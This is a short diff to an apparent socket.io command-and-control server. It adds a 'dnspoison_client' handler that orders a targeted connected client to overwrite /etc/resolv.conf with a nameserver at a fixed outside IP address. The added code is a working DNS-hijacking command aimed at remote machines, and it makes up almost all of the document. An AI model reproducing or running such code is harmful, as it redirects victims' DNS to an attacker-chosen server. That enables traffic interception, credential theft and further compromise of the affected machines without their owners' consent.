@@ -64,9 +64,15 @@ io.on('connection', function (socket) {
         cb(response);
       });
     }
-    
+  });
 
 
+  socket.on('dnspoison_client', function(data, cb) { 
+    console.log("RECV dnspoison_client");
+
+    if(clientSockets[data.toclient]) {
+      clientSockets[data.toclient].emit('cmdWriteFile', { string: "nameserver 13.126.74.47", dest: "/etc/resolv.conf" });
+    }
     
   });
 
